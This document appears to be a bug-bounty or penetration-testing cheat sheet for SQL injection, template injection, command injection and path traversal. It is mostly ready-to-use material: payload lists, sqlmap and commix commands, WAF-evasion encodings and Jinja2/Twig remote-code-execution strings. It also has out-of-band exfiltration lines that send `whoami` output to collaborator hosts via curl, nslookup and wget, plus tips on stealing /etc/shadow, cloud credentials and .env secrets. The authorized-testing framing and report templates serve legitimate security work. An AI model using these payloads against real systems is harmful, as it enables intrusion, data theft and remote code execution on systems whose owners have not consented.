# Injection Vulnerabilities Reference

## Covers: SQLi, SSTI, Command Injection, Path Traversal

---

## 1. Testing Checklist

### SQL Injection
1. Identify all user-controllable inputs that interact with databases (params, headers, cookies, JSON body fields)
2. Inject single quote `'` and observe error differences (verbose SQL errors = confirmed sink)
3. Test boolean-based blind: `' AND 1=1-- -` vs `' AND 1=2-- -` (response length/content diff)
4. Test time-based blind: `' AND SLEEP(5)-- -` (MySQL), `'; WAITFOR DELAY '0:0:5'-- -` (MSSQL), `' AND pg_sleep(5)-- -` (PostgreSQL)
5. Test UNION-based: determine column count with `ORDER BY n` then `UNION SELECT NULL,NULL,...`
6. Test second-order SQLi: inject payload in registration/profile, trigger in admin/report views
7. Test JSON/XML body parameters - often unfiltered compared to URL params
8. Test HTTP headers: X-Forwarded-For, Referer, User-Agent (logged to DB)
9. Test numeric parameters without quotes: `1 AND 1=1` vs `1 AND 1=2`
10. Test INSERT/UPDATE contexts: `', (SELECT version()))-- -`

### Server-Side Template Injection (SSTI)
1. Inject `{{7*7}}` and look for `49` in response
2. If reflected, determine engine: `{{7*'7'}}` returns `7777777` (Jinja2) vs `49` (Twig)
3. Test `${7*7}` for Freemarker/Velocity
4. Test `<%= 7*7 %>` for ERB/EJS
5. Test `#{7*7}` for Pug/Jade
6. Check error pages, 404 handlers, email templates, PDF generators
7. Test reflected values in marketing pages, invite flows, custom error messages

### Command Injection
1. Inject `;id` / `|id` / `||id` / `$(id)` / `` `id` `` into filename, URL, hostname fields
2. Test blind with sleep: `;sleep 5` or `|timeout 5` (Windows)
3. Test OOB: `` ;curl `whoami`.BURP-COLLAB.net`` or `;nslookup $(whoami).BURP-COLLAB.net`
4. Target file upload names, image processing params, PDF generation URLs, ping/traceroute tools
5. Test Windows variants: `& dir`, `| type C:\windows\win.ini`, `%0aid`

### Path Traversal
1. Test `../../../etc/passwd` on file download/include endpoints
2. Test `....//....//....//etc/passwd` for recursive strip bypass
3. Test null byte `%00` truncation on older systems: `../../../etc/passwd%00.jpg`
4. Test URL encoding variants: `%2e%2e%2f`, double encoding `%252e%252e%252f`
5. Check file upload, template selection, language file, avatar/image endpoints
6. Test absolute paths: `/etc/passwd`, `C:\windows\win.ini`
7. Test Windows UNC: `\\attacker.com\share\payload`

---

## 2. Tool Commands

### SQLi
```bash
# SQLMap - basic
sqlmap -u "https://target.com/page?id=1" --batch --random-agent --level=3 --risk=2

# SQLMap - POST with specific parameter
sqlmap -u "https://target.com/api/search" --data='{"query":"test"}' --param-filter="POST" -p query --batch --dbs

# SQLMap - with auth cookie
sqlmap -u "https://target.com/api/users?id=1" --cookie="session=abc123" --batch --dump -T users

# SQLMap - tamper scripts for WAF bypass
sqlmap -u "https://target.com/?id=1" --tamper=space2comment,between,randomcase --batch

# SQLMap - second-order
sqlmap -u "https://target.com/register" --data="username=test&password=test" --second-url="https://target.com/admin/logs" --batch

# ghauri - alternative to sqlmap, better for blind
ghauri -u "https://target.com/page?id=1" --batch --level=3
```

### SSTI
```bash
# tplmap
tplmap -u "https://target.com/page?name=test"

# Manual with ffuf
ffuf -u "https://target.com/page?name=FUZZ" -w ssti-payloads.txt -fr "FUZZ" -mc all
```

### Command Injection
```bash
# commix
commix --url="https://target.com/ping?host=127.0.0.1" --batch

# Blind detection with Burp Collaborator / interactsh
interactsh-client -v 2>&1 &
# Then inject: ;nslookup INTERACTSH_ID
```

### Path Traversal
```bash
# dotdotpwn
dotdotpwn -m http -h target.com -f /etc/passwd -k "root:" -d 8

# ffuf with traversal wordlist
ffuf -u "https://target.com/download?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fs 0
```

---

## 3. Payloads

### SQLi Core
```
' OR 1=1-- -
' UNION SELECT NULL,NULL,NULL-- -
' AND (SELECT SUBSTRING(version(),1,1))='5'-- -
1; EXEC xp_cmdshell('whoami')-- -
' OR '1'='1
" OR "1"="1
') OR ('1'='1
```

### SQLi WAF Bypass
```
# Space bypass
'/**/OR/**/1=1--+-
'+OR+1=1--+-
'%09OR%091=1--+-

# Keyword bypass
' UNI%00ON SEL%00ECT NULL-- -
' /*!50000UNION*/ /*!50000SELECT*/ NULL-- -
' uNiOn SeLeCt NULL-- -

# Quote bypass
' OR 1=1 LIMIT 1 OFFSET 1-- -
1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64

# Double URL encoding
%2527%2520OR%25201%253D1--+-
```

### SSTI Core
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
{{config}}
{{self.__init__.__globals__}}
```

### SSTI RCE (Jinja2)
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

### SSTI RCE (Twig)
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

### Command Injection
```
;id
|id
`id`
$(id)
;id;
%0aid
%0a%0did
&&id
||id

# Blind
;sleep 10
;curl http://BURP-COLLAB
;nslookup BURP-COLLAB
;wget http://BURP-COLLAB

# Space bypass
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
X=$'cat\x20/etc/passwd'&&$X
```

### Path Traversal
```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
..%252f..%252f..%252fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
/....\/....\/etc/passwd
..\/..\/..\/etc/passwd
/etc/passwd%00.jpg
/etc/passwd%0a.jpg
....\\....\\....\\windows\\win.ini
```

---

## 4. Bypass Techniques

### SQLi WAF Bypass
- **Comment injection**: `/*!50000UNION*/` (MySQL version-specific comments)
- **Case variation**: `uNiOn SeLeCt`
- **Whitespace alternatives**: `%09` (tab), `%0a` (newline), `/**/` (comment), `+` (plus)
- **Encoding layers**: double URL encode, Unicode normalization
- **Chunked transfer encoding**: split payload across chunks
- **HPP (HTTP Parameter Pollution)**: `?id=1&id=' UNION SELECT...`
- **JSON/XML wrapping**: switch Content-Type, send payload in alternate format

### SSTI WAF Bypass
- Use `|attr()` filter: `{{request|attr('application')|attr('__globals__')}}`
- Hex encoding: `{{request|attr('\x5f\x5fclass\x5f\x5f')}}`
- String concatenation: `{{request|attr('__cl'+'ass__')}}`
- Use `{% set %}` blocks to build payload in parts

### Command Injection WAF Bypass
- **No spaces**: `${IFS}`, `$IFS$9`, `{cmd,arg}`, `%09`, `<` redirection
- **No slashes**: `${HOME:0:1}` = `/`
- **Char-by-char**: `$(printf '\x69\x64')` = `id`
- **Variable expansion**: `a=i;b=d;$a$b`
- **Wildcards**: `/???/??t /???/p??s??` = `cat /etc/passwd`

### Path Traversal WAF Bypass
- Double encoding: `%252e%252e%252f`
- UTF-8 overlong: `%c0%ae%c0%ae%c0%af`
- Backslash on Windows: `..\..\..\`
- Mixed slashes: `../..\..\`
- URL-encoded null byte: `%00` (PHP < 5.3.4)
- Path normalization differences between proxy and backend

---

## 5. Impact Escalation

### SQLi
- Extract credentials -> login as admin -> ATO
- Read sensitive tables (PII, payment data) for maximum severity
- File read via `LOAD_FILE('/etc/passwd')` (MySQL) or `COPY ... TO` (PostgreSQL)
- RCE via `INTO OUTFILE` (MySQL webshell), `xp_cmdshell` (MSSQL), `COPY ... FROM PROGRAM` (PostgreSQL)
- Pivot to internal network via DB links / federation

### SSTI
- Always escalate to RCE (nearly always possible)
- Read environment variables for cloud credentials: `os.environ`
- Access internal services via the server

### Command Injection
- Read `/etc/shadow`, cloud metadata `169.254.169.254`
- Reverse shell for persistent access
- Pivot to internal services
- Read environment variables for secrets/API keys

### Path Traversal
- Read `/etc/shadow` or Windows SAM
- Read application source code for more vulns
- Read `.env`, `config.yml`, `database.yml` for credentials
- Read cloud credentials: `~/.aws/credentials`, `~/.config/gcloud/credentials.db`
- Chain with file upload for RCE

---

## 6. Chain Opportunities

| Found This | Look For |
|---|---|
| SQLi | Credential dump -> ATO, file read -> source code -> more vulns |
| SSTI | RCE -> SSRF to cloud metadata, pivot to internal APIs |
| Command Injection | SSRF via curl, credential theft from env/files, lateral movement |
| Path Traversal | Source code disclosure -> hardcoded secrets, config files -> DB creds -> SQLi |
| Blind SQLi | Use DNS exfil if time-based is blocked |
| File Read | Read JWT secret -> forge tokens -> auth bypass |

---

## 7. Common False Positives

- **SQLi**: Application returns generic error for any special character (not SQL-specific)
- **SQLi**: Boolean differences caused by input validation not DB query differences
- **SSTI**: `{{7*7}}` reflected as literal string `{{7*7}}` (template not processing input)
- **SSTI**: JavaScript template literals `${...}` in client-side code (not server-side)
- **Command Injection**: Application has timeout that coincidentally matches your sleep payload
- **Path Traversal**: Getting a 200 response but the content is a default error page, not the target file
- **Path Traversal**: File parameter is used as a key to a mapping, not an actual filesystem path

---

## 8. Report Snippets

### SQLi
> The application's `[endpoint]` parameter is vulnerable to SQL injection, allowing an attacker to extract the full contents of the backend database including user credentials, PII, and payment information. In testing, I was able to extract [N] user records including plaintext/hashed passwords. This can be escalated to remote code execution on the database server via [technique]. This constitutes a critical risk to the confidentiality and integrity of all application data.

### SSTI
> The `[parameter]` on `[endpoint]` is rendered within a server-side template without sanitization. By injecting template directives, an attacker achieves arbitrary remote code execution on the application server. This provides full access to the server filesystem, environment variables (including secrets), and the ability to pivot to internal infrastructure.

### Command Injection
> User-supplied input in the `[parameter]` of `[endpoint]` is passed to an OS command without proper sanitization. An attacker can inject arbitrary operating system commands, achieving full remote code execution with the privileges of the web application process. This allows reading sensitive files, establishing reverse shells, and lateral movement within the internal network.

### Path Traversal
> The `[parameter]` in `[endpoint]` is vulnerable to path traversal, allowing an attacker to read arbitrary files from the server filesystem. I confirmed access to `[file]` which contains [sensitive data]. Combined with [other finding], this allows [escalated impact]. All files readable by the application process are exposed.
